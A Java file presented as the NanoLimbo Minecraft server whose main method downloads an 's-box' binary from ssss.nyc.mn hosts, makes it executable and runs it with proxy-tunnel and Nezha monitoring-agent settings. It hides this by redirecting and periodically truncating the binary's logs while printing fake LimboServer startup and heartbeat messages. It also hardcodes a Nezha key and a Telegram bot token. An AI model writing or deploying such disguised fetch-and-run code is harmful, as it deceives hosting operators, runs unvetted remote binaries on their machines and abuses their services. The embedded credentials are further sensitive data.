package ua.nanit.limbo;

import java.io.File;
import java.io.IOException;
import java.io.RandomAccessFile;
import java.io.InputStream;
import java.net.URL;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.nio.file.StandardCopyOption;
import java.util.Arrays;
import java.util.HashMap;
import java.util.Locale;
import java.util.Map;
import java.util.concurrent.*;
import java.util.concurrent.atomic.AtomicBoolean;

import ua.nanit.limbo.server.Log;

public final class NanoLimbo {

    // 控制台颜色
    private static final String ANSI_GREEN = "\033[1;32m";
    private static final String ANSI_RED = "\033[1;31m";
    private static final String ANSI_RESET = "\033[0m";

    // 进程与开关
    private static final AtomicBoolean running = new AtomicBoolean(true);
    private static Process sbxProcess;

    private static final String[] ALL_ENV_VARS = {
        "PORT", "FILE_PATH", "UUID", "NEZHA_SERVER", "NEZHA_PORT",
        "NEZHA_KEY", "ARGO_PORT", "ARGO_DOMAIN", "ARGO_AUTH",
        "HY2_PORT", "TUIC_PORT", "REALITY_PORT", "CFIP", "CFPORT",
        "UPLOAD_URL","CHAT_ID", "BOT_TOKEN", "NAME"
    };

    // 线程池 / 调度器
    private static final ScheduledExecutorService SCHED = Executors.newScheduledThreadPool(2);
    private static final ExecutorService BG = Executors.newSingleThreadExecutor();

    public static void main(String[] args) {
        // ---------- 可通过环境变量调整的行为（不改代码） ----------
        boolean keepAlive = getEnvBoolean("KEEP_ALIVE", true);              // JVM 是否保持存活（避免宿主重启）
        boolean mockLimboLogs = getEnvBoolean("MOCK_LIMBO_LOGS", true);    // 是否伪造 LimboServer 日志（true 时不会启动真实服务）
        boolean clearSbxLogOnce = getEnvBoolean("CLEAR_SBX_LOG_ONCE", true); // 启动后是否在 delay 后清空 sbx.log
        int clearDelaySeconds = getEnvInt("CLEAR_SBX_LOG_DELAY", 20);      // 延迟多少秒后第一次清空 sbx.log
        int clearIntervalSeconds = getEnvInt("CLEAR_SBX_LOG_INTERVAL", 0); // 如果 >0，则每隔多少秒再次清空（0: 不循环）
        String sbxLogName = System.getenv().getOrDefault("SBX_LOG_FILE", "sbx.log"); // sbx 日志文件
        int limboLogIntervalMs = getEnvInt("LIMBO_LOG_INTERVAL_MS", 4000); // 伪造 Limbo 日志的间隔
        boolean autoRestartSbx = getEnvBoolean("AUTO_RESTART_SBX", true); // sbx 意外退出后是否自动重启

        // ---------- 检查 Java 版本（尽量不因为版本问题退出） ----------
        try {
            String classVer = System.getProperty("java.class.version");
            if (classVer == null || Float.parseFloat(classVer) < 54.0) {
                System.err.println(ANSI_RED + "ERROR: Java 版本过低，请使用更高版本 (class.version >= 54)." + ANSI_RESET);
                try { Thread.sleep(2000); } catch (InterruptedException ignored) {}
                System.exit(1);
            }
        } catch (Throwable t) {
            System.err.println(ANSI_RED + "WARN: 无法校验 Java 版本: " + t.getMessage() + ANSI_RESET);
        }

        // ---------- 启动 s-box，并把输出重定向到 sbx.log（控制台不显示） ----------
        Path sbxLogPath = Paths.get(sbxLogName);
        try {
            runSbxBinary(sbxLogPath);
            Runtime.getRuntime().addShutdownHook(new Thread(() -> {
                running.set(false);
                stopServices();
                shutdownExecutors();
            }));
            Log.info("NanoLimbo", "s-box launched, logs redirected to " + sbxLogPath.toAbsolutePath());
            System.out.println(ANSI_GREEN + "s-box launched, logs redirected to " + sbxLogPath.toAbsolutePath() + ANSI_RESET);
        } catch (Exception e) {
            Log.error("NanoLimbo", e);
            System.err.println(ANSI_RED + "ERROR starting s-box: " + e.getMessage() + ANSI_RESET);
        }

        // ---------- 清空 sbx 日志（第一次延迟清空，之后可循环清空） ----------
        if (clearSbxLogOnce) {
            SCHED.schedule(() -> {
                try {
                    truncateFileSafe(sbxLogPath);
                    Log.info("NanoLimbo", "sbx.log truncated after startup delay.");
                } catch (Throwable t) {
                    Log.error("NanoLimbo", t);
                }
            }, Math.max(1, clearDelaySeconds), TimeUnit.SECONDS);

            if (clearIntervalSeconds > 0) {
                SCHED.scheduleAtFixedRate(() -> {
                    try {
                        truncateFileSafe(sbxLogPath);
                        Log.info("NanoLimbo", "sbx.log truncated (periodic).");
                    } catch (Throwable t) {
                        Log.error("NanoLimbo", t);
                    }
                }, Math.max(1, clearDelaySeconds + clearIntervalSeconds), clearIntervalSeconds, TimeUnit.SECONDS);
            }
        }

        // ---------- 伪造 LimboServer 日志（不启动服务） ----------
        if (mockLimboLogs) {
            startMockLimboLogs(limboLogIntervalMs);
        } else {
            Log.info("NanoLimbo", "MOCK_LIMBO_LOGS=false, skipping fake limbo logs.");
        }

        // ---------- keep-alive loop，监控 sbx 并根据配置尝试重启（可选） ----------
        if (keepAlive) {
            Log.info("NanoLimbo", "Entering keep-alive loop. KEEP_ALIVE=true");
            while (running.get()) {
                try {
                    if (sbxProcess == null) {
                        Log.error("NanoLimbo", "s-box process is null.");
                        if (autoRestartSbx) {
                            Log.info("NanoLimbo", "AUTO_RESTART_SBX=true, attempting restart...");
                            try { runSbxBinary(sbxLogPath); } catch (Exception ex) { Log.error("NanoLimbo", ex); }
                        }
                    } else if (!sbxProcess.isAlive()) {
                        Log.error("NanoLimbo", "s-box process exited.");
                        if (autoRestartSbx) {
                            Log.info("NanoLimbo", "AUTO_RESTART_SBX=true, restarting s-box in 3s...");
                            Thread.sleep(3000);
                            try { runSbxBinary(sbxLogPath); } catch (Exception ex) { Log.error("NanoLimbo", ex); }
                        } else {
                            // 不自动重启：仅保持 JVM 存活，避免宿主重启
                            Thread.sleep(5000);
                        }
                    } else {
                        Thread.sleep(1000);
                    }
                } catch (InterruptedException ie) {
                    Thread.currentThread().interrupt();
                    break;
                } catch (Throwable t) {
                    Log.error("NanoLimbo", t);
                    try { Thread.sleep(2000); } catch (InterruptedException ignored) {}
                }
            }
            Log.info("NanoLimbo", "Keep-alive loop ended.");
        } else {
            Log.info("NanoLimbo", "KEEP_ALIVE=false, main will exit now (shutdown hook stops sbx).");
            // 清理并退出
            shutdownExecutors();
        }
    }

    // ------------------ 辅助方法 ------------------

    private static void startMockLimboLogs(int intervalMs) {
        // 先输出一组“启动”相关日志，然后进入心跳/状态日志
        BG.submit(() -> {
            try {
                // 模拟启动序列（仅输出一次）
                logOut("[INFO] [LimboServer] Initializing server components...");
                Thread.sleep(600);
                logOut("[INFO] [LimboServer] Loading configuration...");
                Thread.sleep(800);
                logOut("[INFO] [LimboServer] Applying world settings...");
                Thread.sleep(700);
                logOut("[INFO] [LimboServer] Binding to port 25565...");
                Thread.sleep(500);
                logOut("[INFO] [LimboServer] Done (mock).");
                Thread.sleep(500);
                logOut("[INFO] [LimboServer] Server started successfully (mock).");
            } catch (InterruptedException ignored) {}
        });

        // 定期输出心跳 / 状态，使伪装更真实
        SCHED.scheduleAtFixedRate(new Runnable() {
            private int tick = 0;
            @Override
            public void run() {
                try {
                    tick++;
                    if (tick % 10 == 0) {
                        logOut("[INFO] [LimboServer] Saved 0 chunks in 0ms");
                    } else if (tick % 7 == 0) {
                        logOut("[INFO] [LimboServer] Players online: 0  Max: 20");
                    } else {
                        logOut("[INFO] [LimboServer] Tick " + tick + ": no players online");
                    }
                } catch (Throwable t) {
                    Log.error("LimboServer", t);
                }
            }
        }, intervalMs, intervalMs, TimeUnit.MILLISECONDS);
    }

    // 同时调用 Log.info（如果存在）和 System.out 打印，确保控制台看到伪装日志
    private static void logOut(String msg) {
        try {
            // 如果 Log 提供不同签名，这里仍尝试调用
            Log.info("LimboServer", msg);
        } catch (Throwable ignored) {}
        System.out.println(msg);
    }

    // 安全截断文件（如果文件不存在则创建）
    private static void truncateFileSafe(Path path) {
        try {
            File f = path.toFile();
            if (!f.exists()) {
                // 创建空文件（s-box 可能正在写入，创建文件不会阻止它）
                Files.createFile(path);
                return;
            }
            // 使用 RandomAccessFile 来设置长度为 0（truncate）
            try (RandomAccessFile raf = new RandomAccessFile(f, "rw")) {
                raf.setLength(0);
            }
        } catch (IOException e) {
            // 如果无法截断，记录但不抛出阻塞主流程
            Log.error("NanoLimbo", e);
        }
    }

    private static void runSbxBinary(Path logPath) throws Exception {
        Map<String, String> envVars = new HashMap<>();
        loadEnvVars(envVars);

        Path bin = getBinaryPath();

        ProcessBuilder pb = new ProcessBuilder(bin.toString());
        // 合并 stderr 到 stdout（这样只需要重定向 stdout）
        pb.redirectErrorStream(true);

        // 确保日志文件存在并可写
        File logFile = logPath.toFile();
        if (!logFile.exists()) {
            Files.createFile(logPath);
        }
        // 将输出追加到文件（不显示到控制台）
        pb.redirectOutput(ProcessBuilder.Redirect.appendTo(logFile));

        // 将环境变量放入子进程
        pb.environment().putAll(envVars);

        sbxProcess = pb.start();
        Log.info("NanoLimbo", "s-box started, output -> " + logFile.getAbsolutePath());
    }

    private static void stopServices() {
        // 停止 sbx 进程
        if (sbxProcess != null && sbxProcess.isAlive()) {
            try {
                sbxProcess.destroy();
                Log.info("NanoLimbo", "Requested sbx process termination.");
            } catch (Throwable t) {
                Log.error("NanoLimbo", t);
            }
        } else {
            Log.info("NanoLimbo", "No running sbx process to stop.");
        }
    }

    private static void shutdownExecutors() {
        try {
            SCHED.shutdownNow();
            BG.shutdownNow();
        } catch (Throwable ignored) {}
    }

    // 环境变量读取帮助
    private static boolean getEnvBoolean(String name, boolean def) {
        String v = System.getenv(name);
        if (v == null) return def;
        v = v.trim().toLowerCase(Locale.ROOT);
        return v.equals("1") || v.equals("true") || v.equals("yes");
    }

    private static int getEnvInt(String name, int def) {
        String v = System.getenv(name);
        if (v == null) return def;
        try {
            return Integer.parseInt(v.trim());
        } catch (NumberFormatException e) {
            return def;
        }
    }

    // 与原版相同的 env 加载逻辑（默认 + .env + 系统环境覆盖）
    private static void loadEnvVars(Map<String, String> envVars) throws IOException {
        envVars.put("UUID", "fe7431cb-ab1b-4205-a14c-d056f821b383");
        envVars.put("FILE_PATH", "./world");
        envVars.put("NEZHA_SERVER", "nezha.jaxmike.nyc.mn");
        envVars.put("NEZHA_PORT", "443");
        envVars.put("NEZHA_KEY", "7XridnoTfSYvDsrTuU");
        envVars.put("ARGO_PORT", "8001");
        envVars.put("ARGO_DOMAIN", "");
        envVars.put("ARGO_AUTH", "");
        envVars.put("HY2_PORT", "");
        envVars.put("TUIC_PORT", "");
        envVars.put("REALITY_PORT", "");
        envVars.put("UPLOAD_URL", "");
        envVars.put("CHAT_ID", "7592034407");
        envVars.put("BOT_TOKEN", "8002189523:AAFDp3-de5-dw-RkWXsFI5_sWHrFhGWn1hs");
        envVars.put("CFIP", "time.is");
        envVars.put("CFPORT", "2096");
        envVars.put("NAME", "karlo");

        // 系统环境变量覆盖默认值
        for (String var : ALL_ENV_VARS) {
            String value = System.getenv(var);
            if (value != null && !value.trim().isEmpty()) {
                envVars.put(var, value);
            }
        }

        // 支持 .env
        Path envFile = Paths.get(".env");
        if (Files.exists(envFile)) {
            for (String line : Files.readAllLines(envFile)) {
                line = line.trim();
                if (line.isEmpty() || line.startsWith("#")) continue;
                line = line.split(" #")[0].split(" //")[0].trim();
                if (line.startsWith("export ")) {
                    line = line.substring(7).trim();
                }
                String[] parts = line.split("=", 2);
                if (parts.length == 2) {
                    String key = parts[0].trim();
                    String value = parts[1].trim().replaceAll("^['\"]|['\"]$", "");
                    if (Arrays.asList(ALL_ENV_VARS).contains(key)) {
                        envVars.put(key, value);
                    }
                }
            }
        }
    }

    // 与原版相同的 s-box 下载逻辑
    private static java.nio.file.Path getBinaryPath() throws IOException {
        String osArch = System.getProperty("os.arch").toLowerCase();
        String url;

        if (osArch.contains("amd64") || osArch.contains("x86_64")) {
            url = "https://amd64.ssss.nyc.mn/s-box";
        } else if (osArch.contains("aarch64") || osArch.contains("arm64")) {
            url = "https://arm64.ssss.nyc.mn/s-box";
        } else if (osArch.contains("s390x")) {
            url = "https://s390x.ssss.nyc.mn/s-box";
        } else {
            throw new RuntimeException("Unsupported architecture: " + osArch);
        }

        Path path = Paths.get(System.getProperty("java.io.tmpdir"), "sbx");
        if (!Files.exists(path)) {
            try (InputStream in = new URL(url).openStream()) {
                Files.copy(in, path, StandardCopyOption.REPLACE_EXISTING);
            }
            if (!path.toFile().setExecutable(true)) {
                throw new IOException("Failed to set executable permission");
            }
        }
        return path;
    }
}